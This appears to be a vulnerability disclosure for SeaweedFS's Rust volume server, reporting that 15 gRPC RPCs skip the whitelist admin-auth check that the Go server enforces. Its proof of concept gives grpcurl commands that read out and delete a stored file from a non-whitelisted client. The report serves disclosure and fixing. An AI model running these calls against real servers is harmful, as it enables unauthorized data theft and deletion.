repo.description:
### Summary
The Rust volume server (`seaweed-volume/`, documented as "a drop-in replacement for the SeaweedFS Go volume server") is missing the admin-authorization check on 15 of the 29 gRPC RPCs that the Go volume server gates behind it. An operator who sets `-whiteList` to restrict which hosts can perform destructive volume-server operations gets that protection on some RPCs and not others, with no indication of the gap. From any host that is not on the whitelist, `ReadAllNeedles` streams the raw content of every file in a volume, `BatchDelete` deletes files by ID, and `FetchAndWriteNeedle` overwrites them, all with no authorization check at all.

This is not a new design decision that happens to differ from Go. In May 2026 the Go volume server got a fix (`69da20bda`, #9441) that added `checkGrpcAdminAuth` to `FetchAndWriteNeedle` "for parity with the rest of the destructive volume-server RPCs." In June, that fix was ported to Rust (`b5ecfcd28`, #10001), but only its SSRF-guard half. The admin-auth half was dropped in the port, and the same gap exists in 14 other RPCs that were apparently never audited against the Go side at all.
### Scope

This report targets the trust boundary SECURITY.md describes as in-scope: "unauthenticated access to data or operations that require authentication," reached here specifically through the carve-out in the Trust model section, which reads: "[internal APIs are not an authentication boundary] unless you explicitly enable a control (for example volume JWT or filer authentication) and that control is bypassed." `-whiteList` is exactly that kind of explicitly-enabled control, and it is demonstrably bypassed: in the same server session, with the same whitelist configuration, `AllocateVolume` correctly refuses the test client while `ReadAllNeedles` and `BatchDelete` do not. This is not "direct access to an internal cluster port" (the out-of-scope case); the operator locked the door, and 15 of 29 doors don't check the lock.

`-whiteList` is not a soft or advisory setting standing in for a "real" control; the project's own sources describe it as one. The Rust porting plan (`VOLUME_SERVER_RUST_PLAN.md`) titles the relevant section "Phase 7: Security Layer," with the stated goal "JWT authentication, whitelist guard, TLS configuration" (lines 405-406), and lists the whitelist guard as item 7.1 (line 415), alongside JWT (7.2, line 420) and TLS (7.3, line 427), as peer components of that same security layer, not as a lesser mechanism next to "real" authentication. And the Go reference implementation's own comment on `checkGrpcAdminAuth` (`weed/server/volume_grpc_admin.go:41-42`) frames a denial as evidence of hostile activity, not misconfiguration: "Failed authorization attempts are logged so an operator running with a configured whitelist can spot misconfigured callers and probe attempts."

- **Affected version:** release tag `4.41` (2026-08-06) and current `master` (`db5a086d048c5c2d6e51e82bb070d20df04d688d`, 2026-08-12). Confirmed by reading `seaweed-volume/src/server/grpc_server.rs` as checked out at the `4.41` tag directly (`git show 4.41:seaweed-volume/src/server/grpc_server.rs`): `read_all_needles` has no `check_grpc_admin_auth` call in that tagged revision either, so this is not a master-only regression.
- **Deployment/configuration:** a single Rust volume server (`weed-volume`) started with `-whiteList` set to a non-empty list, pointed at any master (real or the fake stub used for the PoC). No other SeaweedFS component (filer, S3 gateway, admin server) is involved or required.
- **Reachable ports:** the volume server's gRPC port (HTTP port + 10000, e.g. `18080` for the default `8080`), reachable by the attacking client. No HTTP-only access needed for the exploit itself, though HTTP is used in the PoC to plant/verify file content.
- **Authentication in effect:** `-whiteList` is set and confirmed active (the control call denies the attacker throughout). No volume JWT, no filer auth, no other layer; this report is entirely about the whitelist control itself, not about a control that was never turned on.
- **Attacker's starting position:** fully unauthenticated network client, explicitly excluded from the configured whitelist. No credentials, tokens, or any privileged network position (e.g. being an existing cluster member) are required, only gRPC reachability to the volume server's advertised gRPC port.
- **Trust boundary crossed:** a client the operator's own `-whiteList` control explicitly excludes reads and deletes arbitrary file content anyway, via RPCs that should enforce the identical check enforced on sibling RPCs (`AllocateVolume`, `VacuumVolumeCompact`, and 12 others already do this correctly).
- **Expected vs. actual:** expected: every RPC gated in the Go volume server (29 total) is gated identically in the Rust port, so a non-whitelisted client is refused uniformly. Actual: only 14 of 29 are gated; the other 15, including read-everything (`ReadAllNeedles`) and delete-by-id (`BatchDelete`), silently allow any caller regardless of whitelist membership.

### Details
**The control.** Both volume servers accept `-whiteList <ip1,ip2,...>`, "comma separated IP addresses having write permission." Go enforces it per-RPC via `checkGrpcAdminAuth` (`weed/server/volume_grpc_admin.go:43`); Rust enforces it per-RPC via `check_grpc_admin_auth` (`seaweed-volume/src/server/grpc_server.rs:157`). Both implementations are equivalent: an empty whitelist allows everyone (the default, matching SECURITY.md's documented trust model), a populated whitelist checks the caller's peer IP against it.

**The gap.** I enumerated every Go `VolumeServer` RPC and whether its body calls `checkGrpcAdminAuth`, then cross-referenced each Go-gated RPC against its Rust equivalent in `seaweed-volume/src/server/grpc_server.rs`. There is no blanket auth interceptor at the gRPC transport layer in either implementation (checked `seaweed-volume/src/main.rs`; the only registered layer is `GrpcRequestIdLayer`, unrelated to auth), so gating is genuinely per-handler in both languages. Of 29 Go RPCs that call `checkGrpcAdminAuth`, 15 have a Rust implementation that never calls `check_grpc_admin_auth`:

| RPC | Go (gated) | Rust (`grpc_server.rs`) |
|---|---|---|
| `BatchDelete` | `weed/server/volume_grpc_batch_delete.go:16` | `batch_delete`, line 292 (no gate) |
| `FetchAndWriteNeedle` | `weed/server/volume_grpc_remote.go:222` | `fetch_and_write_needle`, line 3849 (no gate) |
| `ReadAllNeedles` | `weed/server/volume_grpc_read_all.go` | `read_all_needles`, line 1987 (no gate) |
| `ScrubEcVolume` | `weed/server/volume_grpc_scrub.go` | `scrub_ec_volume`, line 4104 (no gate) |
| `SetState` | `weed/server/volume_grpc_state.go` | `set_state`, line 1134 (no gate) |
| `VolumeCopy` | `weed/server/volume_grpc_copy.go` | `volume_copy`, line 1186 (no gate) |
| `VolumeEcShardsCopy` | `weed/server/volume_grpc_erasure_coding.go` | `volume_ec_shards_copy`, line 2612 (no gate) |
| `VolumeEcShardsGenerate` | `weed/server/volume_grpc_erasure_coding.go` | `volume_ec_shards_generate`, line 2312 (no gate) |
| `VolumeEcShardsRebuild` | `weed/server/volume_grpc_erasure_coding.go` | `volume_ec_shards_rebuild`, line 2412 (no gate) |
| `VolumeEcShardsToVolume` | `weed/server/volume_grpc_erasure_coding.go` | `volume_ec_shards_to_volume`, line 3157 (no gate) |
| `VolumeEcShardsUnmount` | `weed/server/volume_grpc_erasure_coding.go` | `volume_ec_shards_unmount`, line 2994 (no gate) |
| `VolumeNeedleStatus` | `weed/server/volume_grpc_admin.go` | `volume_needle_status`, line 4461 (no gate) |
| `VolumeTailReceiver` | `weed/server/volume_grpc_tail.go` | `volume_tail_receiver`, line 2187 (no gate) |
| `VolumeTierMoveDatFromRemote` | `weed/server/volume_grpc_tier_download.go` | `volume_tier_move_dat_from_remote`, line 3589 (no gate) |
| `VolumeTierMoveDatToRemote` | `weed/server/volume_grpc_tier_upload.go` | `volume_tier_move_dat_to_remote`, line 3423 (no gate) |

Each row was confirmed by reading the full body of the Rust function (not just a substring match): `check_grpc_admin_auth` does not appear anywhere between its `async fn` and the next one. For contrast, the very next function after `fetch_and_write_needle` in the same file, `scrub_volume` (line 4004), opens with `self.check_grpc_admin_auth(&request)?;` as its first line, which is the pattern all 14 correctly-gated Rust RPCs follow.

`fetch_and_write_needle` is the clearest case because the comment above its SSRF check spells out exactly what was and wasn't ported:

```rust
// Reject SSRF-prone endpoints unless the operator opted out. ...
// Extends the Go volume server's validateRemoteEndpoint gate, which only
// covered type "s3".
if !self.state.allow_untrusted_remote_endpoints {
    if let Some(endpoint) = crate::remote_storage::s3_compatible_endpoint(remote_conf) {
        ...
    }
}
```

The SSRF-endpoint check made the trip from Go to Rust, twice over (the endpoint-validation logic was actually strengthened beyond the Go original). `self.check_grpc_admin_auth(&request)?`, the other half of the same Go commit, never did.

### PoC
Built `seaweed-volume` at current `master` (`db5a086d048c5c2d6e51e82bb070d20df04d688d`, 2026-08-12) with `cargo build --bin weed-volume`. Started it against a minimal stub master (only `GetMasterConfiguration` implemented, enough to satisfy startup) with a whitelist that does not include the test client's own IP:

```
weed-volume --port 8080 --dir /tmp/vol1 --max 1 \
  --whiteList "10.99.99.99" --master "127.0.0.1:9333"
```

Test client IP: `192.168.222.141` (not in the whitelist).

**Step 1, confirm the whitelist is active.** Call a correctly-gated RPC:

```
$ grpcurl -plaintext -d '{"volume_id": 999, "collection": "poc"}' \
    192.168.222.141:18080 volume_server_pb.VolumeServer/AllocateVolume
ERROR:
  Code: PermissionDenied
  Message: not authorized: 192.168.222.141
```

**Step 2, set up real data.** Restarted with the same client IP temporarily whitelisted, allocated volume 1, and uploaded a file through the normal HTTP path:

```
$ curl -s -X POST -F "file=@secret.txt" "http://192.168.222.141:8080/1,01637037d6"
{"name":"secret.txt","size":81,"eTag":"daddbd9d","mime":"text/plain"}
```
`secret.txt` contained: `TOP-SECRET-CUSTOMER-PII: SSN 123-45-6789, contents belonging to tenant Acme Corp`

**Step 3, restart with the client IP removed from the whitelist** (`-whiteList 10.99.99.99`, same data directory, so the volume and file persist), and repeat the control call to confirm the block is back in effect:

```
$ grpcurl -plaintext -d '{"volume_id": 999, "collection": "poc"}' \
    192.168.222.141:18080 volume_server_pb.VolumeServer/AllocateVolume
ERROR:
  Code: PermissionDenied
  Message: not authorized: 192.168.222.141
```

**Step 4, exfiltrate the file the client is locked out of, via the ungated `ReadAllNeedles`:**

```
$ grpcurl -plaintext -d '{"volume_ids": [1]}' \
    192.168.222.141:18080 volume_server_pb.VolumeServer/ReadAllNeedles
{
  "volumeId": 1,
  "needleId": "1",
  "needleBlob": "VE9QLVNFQ1JFVC1DVVNUT01FUi1QSUk6IFNTTiAxMjMtNDUtNjc4OSwgY29udGVudHMgYmVsb25naW5nIHRvIHRlbmFudCBBY21lIENvcnAK",
  ...
  "name": "c2VjcmV0LnR4dA==",
}
```
`base64 -d` on `needleBlob` returns the exact `secret.txt` content.

**Step 5, delete the same file via the ungated `BatchDelete`:**

```
$ grpcurl -plaintext -d '{"file_ids": ["1,01637037d6"]}' \
    192.168.222.141:18080 volume_server_pb.VolumeServer/BatchDelete
{"results": [{"fileId": "1,01637037d6", "status": 202, "size": 113}]}

$ curl -s -o /dev/null -w "%{http_code}\n" "http://192.168.222.141:8080/1,01637037d6"
404
```

Both the read and the delete came from the same client IP that `AllocateVolume` had just refused, in the same server session, with the same whitelist configuration, no credentials of any kind.

### Impact
An operator who configures `-whiteList` to restrict destructive volume-server operations to trusted hosts, exactly what SeaweedFS's own security documentation frames as "a control you explicitly enable," gets that protection for 14 of 29 destructive RPCs on the Rust volume server and not the other 15. Any client that can reach the gRPC port, regardless of whitelist membership, can:

- Read the complete raw contents of every file in any volume (`ReadAllNeedles`)
- Delete files by ID (`BatchDelete`)
- Overwrite needle content, including from an attacker-controlled remote source (`FetchAndWriteNeedle`)
- Move volume tier data to and from remote storage (`VolumeTierMoveDatFromRemote`/`ToRemote`)
- Manipulate erasure-coded shards: generate, rebuild, copy, unmount, and convert back to a normal volume
- Force a volume server's internal state (`SetState`) and query needle status information

This crosses the exact boundary SECURITY.md lists as in-scope: "unauthenticated access to data or operations that require authentication" and "remotely triggered data corruption or loss." It is not a deployment mistake on the operator's part, the whitelist is configured and working (confirmed by `AllocateVolume` being correctly refused throughout); it simply does not cover most of the operations it is meant to.

Suggested fix: add `self.check_grpc_admin_auth(&request)?;` as the first line of each of the 15 listed RPC handlers in `seaweed-volume/src/server/grpc_server.rs`, matching their Go counterparts and the pattern already used by the 14 correctly-gated Rust RPCs. Given how this gap arose (a partial port plus 14 more instances that look never to have been audited against Go at all), it would be worth adding a CI check that fails when a Go RPC calls `checkGrpcAdminAuth` and its Rust counterpart doesn't, so a future addition to either side can't silently drop the parity again.
